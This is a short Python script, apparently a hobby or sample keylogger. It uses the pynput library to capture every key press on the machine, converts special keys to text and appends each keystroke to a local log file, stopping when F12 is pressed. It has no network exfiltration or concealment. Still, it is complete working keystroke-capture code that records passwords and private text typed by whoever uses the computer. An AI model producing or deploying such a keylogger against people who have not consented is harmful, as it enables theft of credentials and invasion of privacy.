from pynput.keyboard import Listener

def test(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.enter":
        key = "\n"
    if key == "Key.tab":
        key = "\n"
    if key == "Key.backspace":
        key = "\b"
    if key == "Key.space":
        key = " "
    if key == "Key.ctrl_l":
        key = ""
    if key == "Key.ctrl_r":
        key = ""
    if key == "Key.shift_r":
        key = ""
    if key == "Key.caps_lock":
        key = ""
    with open("log.txt", "a") as file: 
        file.write(key)
    print(key)

with Listener(on_press=test) as listener:
    listener.join()
